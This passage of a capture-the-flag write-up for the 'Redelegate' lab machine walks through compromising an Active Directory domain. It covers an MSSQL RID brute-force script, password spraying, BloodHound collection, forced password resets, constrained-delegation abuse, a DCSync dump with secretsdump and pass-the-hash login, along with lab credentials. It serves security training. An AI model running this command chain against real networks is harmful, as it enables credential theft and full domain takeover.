+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SID_BASE=<span class="string">&quot;010500000000000515000000a185deefb22433798d8e847a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> RID <span class="keyword">in</span> &#123;1000..1500&#125;; <span class="keyword">do</span></span><br><span class="line">    HEX_RID=$(python3 -c <span class="string">&quot;import struct; print(struct.pack(&#x27;&lt;I&#x27;, <span class="variable">$&#123;RID&#125;</span>).hex())&quot;</span>)</span><br><span class="line">    SID=<span class="string">&quot;<span class="variable">$&#123;SID_BASE&#125;</span><span class="variable">$&#123;HEX_RID&#125;</span>&quot;</span></span><br><span class="line">    RES=$(impacket-mssqlclient SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl -file &lt;( <span class="built_in">echo</span> <span class="string">&quot;select SUSER_SNAME(0x<span class="variable">$&#123;SID&#125;</span>);&quot;</span>) 2&gt;&amp;1 | sed -n <span class="string">&#x27;/^----/&#123;n;p;&#125;&#x27;</span>)</span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">&#x27;\r&#x27;</span><span class="string">&quot;<span class="variable">$&#123;RID&#125;</span>: <span class="variable">$&#123;RES&#125;</span>&quot;</span></span><br><span class="line">    [[ <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$RES</span>&quot;</span> | xargs)</span>&quot;</span> != <span class="string">&quot;NULL&quot;</span> ]] &amp;&amp; <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><em>(Credit to <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/">0xdf</a> and his Discord community for this elegant script)</em></p>
+<p><img src="/images/Redelegate/brute-user-msssql.png" alt="User Enumeration via MSSQL"></p>
+<h3 id="Discovered-Users"><a href="#Discovered-Users" class="headerlink" title="Discovered Users"></a>Discovered Users</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Christine.Flanders</span><br><span class="line">Marie.Curie</span><br><span class="line">Helen.Frost</span><br><span class="line">Michael.Pontiac</span><br><span class="line">Mallory.Roberts</span><br><span class="line">James.Dinkleberg</span><br><span class="line">Ryan.Cooper</span><br><span class="line">sql_svc</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h2><p>Now that we have a list of usernames and potential passwords from the KeePass database, let’s perform password spraying:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.129.234.50 -u usernames.txt -p passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Success!</strong> We find valid credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] redelegate.vl\Marie.Curie:Fall2024!</span><br></pre></td></tr></table></figure>
+
+<p>This account also has LDAP authentication privileges, perfect for BloodHound enumeration.</p>
+<hr>
+<h2 id="Active-Directory-Enumeration-with-BloodHound"><a href="#Active-Directory-Enumeration-with-BloodHound" class="headerlink" title="Active Directory Enumeration with BloodHound"></a>Active Directory Enumeration with BloodHound</h2><p>Let’s dump LDAP data and ingest it into BloodHound:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.129.234.50 -u Marie.Curie -p &#x27;Fall2024!&#x27; --bloodhound --dns-server 10.129.234.50 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="BloodHound-Analysis"><a href="#BloodHound-Analysis" class="headerlink" title="BloodHound Analysis"></a>BloodHound Analysis</h3><p>After analyzing the data in BloodHound, we discover multiple attack paths:</p>
+<p><img src="/images/Redelegate/good-path-redelaagate.png" alt="Attack Paths in BloodHound"></p>
+<p>We have <strong>ForceChangePassword</strong> privileges on several users, including:</p>
+<ul>
+<li><strong>sql_svc account</strong></li>
+<li><strong>Helen.Frost</strong> (who has <strong>GenericAll</strong> over <strong>FS01$</strong>)</li>
+</ul>
+<p><img src="/images/Redelegate/all-perms-bloodhound.png" alt="All Permissions in BloodHound"></p>
+<hr>
+<h2 id="Lateral-Movement-to-Helen-Frost"><a href="#Lateral-Movement-to-Helen-Frost" class="headerlink" title="Lateral Movement to Helen.Frost"></a>Lateral Movement to Helen.Frost</h2><p>Let’s pursue the Helen.Frost path since she has powerful permissions. First, we’ll force a password change:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -H 10.129.234.50 -d &quot;REDELEGATE.VL&quot; -u &quot;Marie.Curie&quot; -p &#x27;Fall2024!&#x27; set password &quot;Helen.Frost&quot; &#x27;Fall2024!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Now we can authenticate via WinRM:</p>
+<p><img src="/images/Redelegate/winrm-redelagate.png" alt="WinRM Access"></p>
+<p><img src="/images/Redelegate/whomai-helen-frost.png" alt="Whoami as Helen.Frost"></p>
+<h3 id="Identifying-Privileges"><a href="#Identifying-Privileges" class="headerlink" title="Identifying Privileges"></a>Identifying Privileges</h3><p>Helen.Frost has the <strong><code>SeEnableDelegationPrivilege</code></strong>, which indicates we can abuse Kerberos delegation mechanisms.</p>
+<p>There are three types of Kerberos delegation:</p>
+<ul>
+<li><strong>Unconstrained Delegation (KUD):</strong> A service can impersonate users on any other service</li>
+<li><strong>Constrained Delegation (KCD):</strong> A service can impersonate users on a set of specific services</li>
+<li><strong>Resource-Based Constrained Delegation (RBCD):</strong> A set of services can impersonate users on a specific service</li>
+</ul>
+<p>Reference: <a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/">https://www.thehacker.recipes/ad/movement/kerberos/delegations/</a></p>
+<p>I initially explored RBCD, but none of our accounts can add machine accounts (MachineAccountQuota is 0).</p>
+<hr>
+<h2 id="Privilege-Escalation-Administrator"><a href="#Privilege-Escalation-Administrator" class="headerlink" title="Privilege Escalation - Administrator"></a>Privilege Escalation - Administrator</h2><h3 id="Constrained-Delegation-Abuse"><a href="#Constrained-Delegation-Abuse" class="headerlink" title="Constrained Delegation Abuse"></a>Constrained Delegation Abuse</h3><p>Since Helen.Frost has <strong>GenericAll</strong> over <strong>FS01$</strong>, we can configure Constrained Delegation on the FS01 machine account.</p>
+<p>First, connect via PowerShell using Evil-WinRM, then execute:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ADAccountControl -Identity &quot;FS01$&quot; -TrustedToAuthForDelegation $True</span><br><span class="line">Set-ADObject -Identity &quot;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&quot; -Add @&#123;&quot;msDS-AllowedToDelegateTo&quot;=&quot;ldap/dc.redelegate.vl&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>What we’ve done:</strong></p>
+<ol>
+<li>Set the <strong>TrustedToAuthForDelegation</strong> flag to <code>True</code> on FS01$</li>
+<li>Added an SPN that allows FS01$ to delegate to the LDAP service on the domain controller</li>
+</ol>
+<p>Now FS01$ is allowed to act as the LDAP service on the DC.</p>
+<h3 id="Changing-FS01-Password"><a href="#Changing-FS01-Password" class="headerlink" title="Changing FS01$ Password"></a>Changing FS01$ Password</h3><p>Next, we need to change the password of the FS01 machine account so we can use it to request service tickets:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -H 10.129.234.50 -d &quot;REDELEGATE.VL&quot; -u &quot;Helen.frost&quot; -p &#x27;Fall2024!&#x27; set password &#x27;FS01$&#x27; &#x27;Fall2024!&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Requesting-Service-Ticket-with-Impersonation"><a href="#Requesting-Service-Ticket-with-Impersonation" class="headerlink" title="Requesting Service Ticket with Impersonation"></a>Requesting Service Ticket with Impersonation</h3><p>Now we can request a service ticket (ST) while impersonating the domain controller:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST &#x27;redelegate.vl/FS01$:Fall2024!&#x27; -spn ldap/dc.redelegate.vl -impersonate dc</span><br></pre></td></tr></table></figure>
+
+<h3 id="DCSync-Attack"><a href="#DCSync-Attack" class="headerlink" title="DCSync Attack"></a>DCSync Attack</h3><p>Load the ticket and execute secretsdump to perform a DCSync attack:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=dc.ccache impacket-secretsdump -k -no-pass dc.redelegate.vl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Administrator-Access"><a href="#Administrator-Access" class="headerlink" title="Administrator Access"></a>Administrator Access</h3><p>Finally, use the Administrator hash to authenticate via WinRM and retrieve the root flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i dc.redelegate.vl -u Administrator -H ec1HASHHASHHASH:)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Redelegate was an excellent machine for practicing Active Directory attacks, particularly Kerberos delegation abuse. The attack chain involved:</p>
+<ol>
+<li>Anonymous FTP enumeration</li>
+<li>KeePass database cracking with custom wordlists</li>
+<li>MSSQL authentication and user enumeration</li>
+<li>Password spraying to gain initial access</li>
+<li>BloodHound analysis to identify attack paths</li>
+<li>Abusing Constrained Delegation to achieve domain compromise</li>
+</ol>
+<p><strong>Key Takeaways:</strong></p>
+<ul>
+<li>Always enumerate thoroughly - the training agenda hint was crucial</li>
+<li>Custom wordlists are often more effective than generic ones</li>
+<li>BloodHound is invaluable for identifying complex AD attack paths</li>
+<li>Understanding Kerberos delegation is essential for advanced AD exploitation</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redelegate-VulnLab-Complete-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Redelegate VulnLab - Complete Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Anonymous-Access"><span class="toc-number">1.2.2.</span> <span class="toc-text">FTP Anonymous Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-the-KeePass-Database"><span class="toc-number">1.3.</span> <span class="toc-text">Cracking the KeePass Database</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-the-Hash"><span class="toc-number">1.3.1.</span> <span class="toc-text">Extracting the Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Cracking-Attempt"><span class="toc-number">1.3.2.</span> <span class="toc-text">Initial Cracking Attempt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generating-Custom-Wordlist"><span class="toc-number">1.3.3.</span> <span class="toc-text">Generating Custom Wordlist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeePass-Database-Contents"><span class="toc-number">1.3.4.</span> <span class="toc-text">KeePass Database Contents</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">MSSQL Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Authenticating-to-MSSQL"><span class="toc-number">1.4.1.</span> <span class="toc-text">Authenticating to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Relay-Attack"><span class="toc-number">1.4.2.</span> <span class="toc-text">Hash Relay Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-User-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Domain User Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1-Metasploit-Module"><span class="toc-number">1.5.1.</span> <span class="toc-text">Method 1: Metasploit Module</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2-Manual-Enumeration"><span class="toc-number">1.5.2.</span> <span class="toc-text">Method 2: Manual Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Discovered-Users"><span class="toc-number">1.5.3.</span> <span class="toc-text">Discovered Users</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Spraying"><span class="toc-number">1.6.</span> <span class="toc-text">Password Spraying</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration-with-BloodHound"><span class="toc-number">1.7.</span> <span class="toc-text">Active Directory Enumeration with BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Analysis"><span class="toc-number">1.7.1.</span> <span class="toc-text">BloodHound Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-to-Helen-Frost"><span class="toc-number">1.8.</span> <span class="toc-text">Lateral Movement to Helen.Frost</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-Privileges"><span class="toc-number">1.8.1.</span> <span class="toc-text">Identifying Privileges</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Administrator"><span class="toc-number">1.9.</span> <span class="toc-text">Privilege Escalation - Administrator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Constrained-Delegation-Abuse"><span class="toc-number">1.9.1.</span> <span class="toc-text">Constrained Delegation Abuse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Changing-FS01-Password"><span class="toc-number">1.9.2.</span> <span class="toc-text">Changing FS01$ Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Requesting-Service-Ticket-with-Impersonation"><span class="toc-number">1.9.3.</span> <span class="toc-text">Requesting Service Ticket with Impersonation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync-Attack"><span class="toc-number">1.9.4.</span> <span class="toc-text">DCSync Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Administrator-Access"><span class="toc-number">1.9.5.</span> <span class="toc-text">Administrator Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&text=HTB-Redelegate"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&is_video=false&description=HTB-Redelegate"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Redelegate&body=Check out this article: https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&name=HTB-Redelegate&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&t=HTB-Redelegate"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
